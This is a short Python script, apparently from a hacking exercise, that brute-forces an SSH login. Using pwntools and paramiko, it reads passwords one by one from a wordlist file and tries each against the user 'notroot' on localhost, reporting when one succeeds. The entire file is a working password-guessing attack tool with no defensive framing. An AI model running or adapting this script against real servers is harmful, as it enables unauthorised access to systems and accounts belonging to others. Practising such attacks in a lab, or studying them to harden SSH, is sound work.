from pwn import *
import paramiko
# pwn: This library provides a number of functions useful for exploit development and hacking challenges.
# paramiko: This library is used for SSH protocol implementation in Python.

host = '127.0.0.1'
username = 'notroot'
no_attempts = 0

with open("ssh_brute_force_pass_list.txt", 'r') as pass_list:
    for password in pass_list:
        password = password.strip('\n')
        try:
            print(f"[{no_attempts}] Attempting password: {password}")
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print(f"[Yes!] Successfully found valid password: {password}")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[X] Invalid Password!!!")
        no_attempts += 1
        print("\n")